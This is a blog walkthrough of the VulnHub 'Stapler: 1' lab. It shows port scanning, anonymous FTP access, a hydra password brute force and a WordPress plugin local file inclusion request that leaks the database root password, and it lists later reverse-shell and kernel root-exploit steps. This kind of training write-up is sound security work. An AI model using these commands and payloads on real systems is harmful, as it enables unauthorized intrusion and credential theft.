</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span>                                                                 <span class="o">(</span>__  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span>_ ___<span class="o">)</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">(</span>_ ___<span class="o">)</span>
</span><span class='line'><span class="sb">`</span>-._.-<span class="s1">&#39;                                                                 `-._.-&#39;</span>
</span><span class='line'><span class="c"># </span>
</span></code></pre></td></tr></table></div></figure>




<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Stapler: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/08/15/vulnhub-stapler-1/"/>
    <updated>2016-08-15T21:21:02+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/08/15/vulnhub-stapler-1</id>
    <content type="html"><![CDATA[<p>This is made for BsidesLondon 2016 with average beginner/intermediate difficulty and a few twists :) Also multiple attacking vectors and paths to get shell and ROOT. Author is <a href="https://www.vulnhub.com/author/g0tmi1k,21/">g0tmi1k</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/stapler-1,150/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: Stapler: 1 (<em>10.1.1.138/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>FTP service allow Anonymous login</li>
<li><code>WordPress</code> username and password bruteforce attack</li>
<li>WEB application Full Path Disclosure</li>
<li><a href="https://www.exploit-db.com/exploits/39646/" title="WordPress Advanced Video Plugin 1.0 - Local File Inclusion">WordPress Advanced Video Plugin 1.0 - Local File Inclusion</a></li>
<li><a href="https://www.exploit-db.com/exploits/39772/" title="Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit">Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; in bpf(BPF_PROG_LOAD) Local Root Exploit</a></li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Scan specific vulnerability for WordPress CMS [<font color="FF8000">wpscan</font>]</li>
<li>Exploit WordPress plugin LFI vulnerability to read sensitive informtion</li>
<li>Connect to target server&rsquo;s MySQL service as root and write reverse PHP web shell</li>
<li>Connect to target server&rsquo;s MySQL service and download <code>wp_users</code> table which username and password hash saved in</li>
<li>Crack WordPress administrator/editor account and login to upload webshell [<font color="FF8000">php-reverse-shell</font>]</li>
<li>Enumeration and exploit the local priviledge vulnerability to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://wpscan.org/">wpscan</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.138    00:0c:29:b4:04:59   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:e8:0a:52   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.283 seconds <span class="o">(</span>112.13 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure>


<p><code>10.1.1.138</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# masscan -p1-65535 10.1.1.138/32 --rate<span class="o">=</span><span class="m">10000</span> <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f <span class="m">4</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tee 138_masscan.txt
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2016-08-12 11:19:28 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'><span class="m">12380</span>
</span><span class='line'>22
</span><span class='line'>21
</span><span class='line'>53
</span><span class='line'>3306
</span><span class='line'>666
</span><span class='line'>80
</span><span class='line'>
</span><span class='line'>root@kali:~/myExercises/stapler# tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> &lt; 138_masscan.txt
</span><span class='line'>12380,22,21,53,3306,666,80,root@kali:~/myExercises/stapler#
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncated...
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.138
</span><span class='line'>Host is up <span class="o">(</span>0.00044s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>21/tcp    open  ftp     vsftpd 2.0.8 or later
</span><span class='line'><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_Can<span class="s1">&#39;t get directory listing: Can&#39;</span>t parse PASV response: <span class="s2">&quot;Permission denied.&quot;</span>
</span><span class='line'>22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_  <span class="m">256</span> 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>53/tcp    open  domain  dnsmasq 2.75
</span><span class='line'><span class="p">|</span> dns-nsid:
</span><span class='line'><span class="p">|</span>_  bind.version: dnsmasq-2.75
</span><span class='line'>80/tcp    open  http
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>_http-title: <span class="m">404</span> Not Found
</span><span class='line'>666/tcp   open  doom?
</span><span class='line'>3306/tcp  open  mysql   MySQL 5.7.13-0ubuntu0.16.04.2
</span><span class='line'><span class="p">|</span> mysql-info:
</span><span class='line'><span class="p">|</span>   Protocol: 53
</span><span class='line'><span class="p">|</span>   Version: .7.13-0ubuntu0.16.04.2
</span><span class='line'><span class="p">|</span>   Thread ID: 8440
</span><span class='line'><span class="p">|</span>   Capabilities flags: 63487
</span><span class='line'><span class="p">|</span>   Some Capabilities: LongPassword, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, Support41Auth, ODBCClient, InteractiveClient, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, LongColumnFlag, SupportsCompression, FoundRows
</span><span class='line'><span class="p">|</span>   Status: Autocommit
</span><span class='line'><span class="p">|</span>_  Salt: <span class="s1">&#39;pw|)\x07ib\x0ByIS3P&lt;Y^jO\x10</span>
</span><span class='line'><span class="s1">12380/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span>
</span><span class='line'><span class="s1">| http-methods: </span>
</span><span class='line'><span class="s1">|_  Supported Methods: GET HEAD POST OPTIONS</span>
</span><span class='line'><span class="s1">|_http-server-header: Apache/2.4.18 (Ubuntu)</span>
</span><span class='line'><span class="s1">|_http-title: Site doesn&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'>...truncated...
</span></code></pre></td></tr></table></div></figure>


<p>Based on the result of NMAP scan, firstly, I found FTP port 21 is open and Anonymous login allowed. So I connected to the FTP server and found a file <code>note</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# ftp 10.1.1.138
</span><span class='line'>Connected to 10.1.1.138.
</span><span class='line'>220-
</span><span class='line'>220-<span class="p">|</span>-----------------------------------------------------------------------------------------<span class="p">|</span>
</span><span class='line'>220-<span class="p">|</span> Harry, make sure to update the banner when you get a chance to show who has access here <span class="p">|</span>
</span><span class='line'>220-<span class="p">|</span>-----------------------------------------------------------------------------------------<span class="p">|</span>
</span><span class='line'>220-
</span><span class='line'><span class="m">220</span>
</span><span class='line'>Name <span class="o">(</span>10.1.1.138:root<span class="o">)</span>: anonymous
</span><span class='line'><span class="m">331</span> Please specify the password.
</span><span class='line'>Password:
</span><span class='line'><span class="m">230</span> Login successful.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt;
</span><span class='line'>ftp&gt; ls
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful. Consider using PASV.
</span><span class='line'><span class="m">150</span> Here comes the directory listing.
</span><span class='line'>-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>             <span class="m">107</span> Jun <span class="m">03</span> 23:06 note
</span><span class='line'><span class="m">226</span> Directory send OK.
</span><span class='line'>ftp&gt; get note
</span><span class='line'><span class="nb">local</span>: note remote: note
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful. Consider using PASV.
</span><span class='line'><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> note <span class="o">(</span><span class="m">107</span> bytes<span class="o">)</span>.
</span><span class='line'><span class="m">226</span> Transfer complete.
</span><span class='line'><span class="m">107</span> bytes received in 0.01 secs <span class="o">(</span>14.1935 kB/s<span class="o">)</span>
</span><span class='line'>ftp&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>root@kali:~/myExercises/stapler# cat note
</span><span class='line'>Elly, make sure you update the payload information. Leave it in your FTP account once your are <span class="k">done</span>, John.
</span><span class='line'>root@kali:~/myExercises/stapler#
</span></code></pre></td></tr></table></div></figure>


<p>From the <code>note</code> file, I know that <code>elly</code> is a ftp user and there could be something about payload stored in her FTP folder.</p>

<p>Then I did a quick FTP login brute force attack against to user <code>elly</code> by using <code>hydra</code> with parameter <code>-e nsr</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# hydra -l elly -e nsr ftp://10.1.1.138
</span><span class='line'>Hydra v8.2 <span class="o">(</span>c<span class="o">)</span> <span class="m">2016</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2016-08-15 22:56:07
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">3</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">3</span> login tries <span class="o">(</span>l:1/p:3<span class="o">)</span>, ~0 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ftp on port 21
</span><span class='line'><span class="o">[</span>21<span class="o">][</span>ftp<span class="o">]</span> host: 10.1.1.138   login: elly   password: ylle
</span><span class='line'><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> finished at 2016-08-15 22:56:11
</span></code></pre></td></tr></table></div></figure>


<p>Great! <code>elly</code>&rsquo;s password is <font color="red"><code>ylle</code></font></p>

<p>Login as <code>elly</code> and found that the home directory is <code>/etc/</code>, so I downloaded the file <code>passwd</code> and <code>vsftpd.conf</code>.</p>

<p>So far, nothing else found, so I decided to move on.</p>

<p>port 12380 is open and running HTTP with SSL. so I did a <code>nikto</code> scan against port 12380</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.138
</span><span class='line'>+ Target Port: 12380
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET Uncommon header <span class="s1">&#39;dave&#39;</span> found, with contents: Soemthing doesn<span class="s1">&#39;t look right here</span>
</span><span class='line'><span class="s1">+ GET The site uses SSL and the Strict-Transport-Security HTTP header is not defined.</span>
</span><span class='line'><span class="s1">+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span>
</span><span class='line'><span class="s1">+ GET Entry &#39;</span>/admin112233/<span class="s1">&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span>
</span><span class='line'><span class="s1">+ GET Entry &#39;</span>/blogblog/<span class="s1">&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span>
</span><span class='line'><span class="s1">+ GET &quot;robots.txt&quot; contains 2 entries which should be manually viewed.</span>
</span><span class='line'><span class="s1">+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </span>
</span><span class='line'><span class="s1">+ GET Uncommon header &#39;</span>x-ob_mode<span class="err">&#39;</span> found, with contents: 1
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span><span class='line'>+ GET /phpmyadmin/: phpMyAdmin directory found
</span></code></pre></td></tr></table></div></figure>


<p>From the nikto scan, we found that WEB server on port 12380 is a HTTPS service and there are three hidden directories <code>/admin112233</code>, <code>/blogblog</code> and <code>/phpmyadmin</code>.</p>

<p>so I checked them one by one, and 1st one is <code>/admin112233</code>, but this is a XSS hook page :(</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# curl -k https://10.1.1.138:12380/admin112233/
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;mwwhahahah&lt;/title&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;noscript&gt;Give yourself a cookie! Javascript didn<span class="err">&#39;</span>t <span class="nv">run</span> <span class="o">=)</span>&lt;/noscript&gt;
</span><span class='line'>&lt;script <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span>&gt;window.alert<span class="o">(</span><span class="s2">&quot;This could of been a BeEF-XSS hook ;)&quot;</span><span class="o">)</span><span class="p">;</span>window.location<span class="o">=</span><span class="s2">&quot;http://www.xss-payloads.com/&quot;</span><span class="p">;</span>&lt;/script&gt;
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span></code></pre></td></tr></table></div></figure>


<p>2nd one is <code>/blogblog</code>, and it&rsquo;s using <code>WordPress CMS</code>.</p>

<p>so next, I run <code>wpscan</code> and found one plugin which is vulnerable to <a href="https://www.exploit-db.com/exploits/39646/" title="WordPress Advanced Video Plugin 1.0 - Local File Inclusion">WordPress Advanced Video Plugin 1.0 - Local File Inclusion</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncated...
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> We found <span class="m">4</span> plugins:
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Name: advanced-video-embed-embed-videos-or-playlists - v1.0
</span><span class='line'> <span class="p">|</span>  Latest version: 1.0 <span class="o">(</span>up to date<span class="o">)</span>
</span><span class='line'> <span class="p">|</span>  Location: https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
</span><span class='line'> <span class="p">|</span>  Readme: https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Directory listing is enabled: https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
</span><span class='line'>...truncated...
</span></code></pre></td></tr></table></div></figure>


<p>Also I use <code>wpscan</code> to enumerate available users and got the following result:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>+----+---------+-----------------+
</span><span class='line'>    <span class="p">|</span> Id <span class="p">|</span> Login   <span class="p">|</span> Name            <span class="p">|</span>
</span><span class='line'>    +----+---------+-----------------+
</span><span class='line'>    <span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> john    <span class="p">|</span> John Smith      <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> elly    <span class="p">|</span> Elly Jones      <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> peter   <span class="p">|</span> Peter Parker    <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> barry   <span class="p">|</span> Barry Atkins    <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">5</span>  <span class="p">|</span> heather <span class="p">|</span> Heather Neville <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">6</span>  <span class="p">|</span> garry   <span class="p">|</span> garry           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">7</span>  <span class="p">|</span> harry   <span class="p">|</span> harry           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">8</span>  <span class="p">|</span> scott   <span class="p">|</span> scott           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">9</span>  <span class="p">|</span> kathy   <span class="p">|</span> kathy           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">10</span> <span class="p">|</span> tim     <span class="p">|</span> tim             <span class="p">|</span>
</span><span class='line'>    +----+---------+-----------------+
</span></code></pre></td></tr></table></div></figure>


<p>By exploiting the Local File Inclusion vulnerability, <code>https://10.1.1.138:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb=../wp-config.php</code></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/stapler/1.png"></p>

<p>Then, back to home page and check the frontpage by right clicking and choose <code>Inspect Element (Q)</code>. Then find the thumbnail file location which is <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/577490208.jpeg</code> in this case.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/stapler/2.png"></p>

<p>Then I use <code>curl</code> to download the thumbnail file and save it to my attacking machine.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# curl -k https://10.1.1.138:12380/blogblog/wp-content/uploads/577490208.jpeg &gt; 1.jpeg
</span><span class='line'>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span><span class='line'>                                 Dload  Upload   Total   Spent    Left  Speed
</span><span class='line'><span class="m">100</span>  <span class="m">3042</span>  <span class="m">100</span>  <span class="m">3042</span>    <span class="m">0</span>     <span class="m">0</span>   <span class="m">7509</span>      <span class="m">0</span> --:--:-- --:--:-- --:--:--  7529
</span></code></pre></td></tr></table></div></figure>


<p>Then checking the file <code>1.jepg</code> which actually is the <code>wp-config.php</code> file.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# strings 1.jpeg
</span><span class='line'>&lt;?php
</span><span class='line'> * The base configurations of the WordPress.
</span><span class='line'> * This file has the following configurations: MySQL settings, Table Prefix,
</span><span class='line'> * Secret Keys, and ABSPATH. You can find more information by visiting
</span><span class='line'> * <span class="o">{</span>@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php<span class="o">}</span>
</span><span class='line'> * Codex page. You can get the MySQL settings from your web host.
</span><span class='line'> * This file is used by the wp-config.php creation script during the
</span><span class='line'> * installation. You don<span class="s1">&#39;t have to use the web site, you can just copy this file</span>
</span><span class='line'><span class="s1"> * to &quot;wp-config.php&quot; and fill in the values.</span>
</span><span class='line'><span class="s1"> * @package WordPress</span>
</span><span class='line'><span class="s1">// ** MySQL settings - You can get this info from your web host ** //</span>
</span><span class='line'><span class="s1">/** The name of the database for WordPress */</span>
</span><span class='line'><span class="s1">define(&#39;</span>DB_NAME<span class="s1">&#39;, &#39;</span>wordpress<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">/** MySQL database username */</span>
</span><span class='line'><span class="s1">define(&#39;</span>DB_USER<span class="s1">&#39;, &#39;</span>root<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">/** MySQL database password */</span>
</span><span class='line'><span class="s1">define(&#39;</span>DB_PASSWORD<span class="s1">&#39;, &#39;</span>plbkac<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">/** MySQL hostname */</span>
</span><span class='line'><span class="s1">define(&#39;</span>DB_HOST<span class="s1">&#39;, &#39;</span>localhost<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">/** Database Charset to use in creating database tables. */</span>
</span><span class='line'><span class="s1">define(&#39;</span>DB_CHARSET<span class="s1">&#39;, &#39;</span>utf8mb4<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">/** The Database Collate type. Don&#39;</span>t change this <span class="k">if</span> in doubt. */
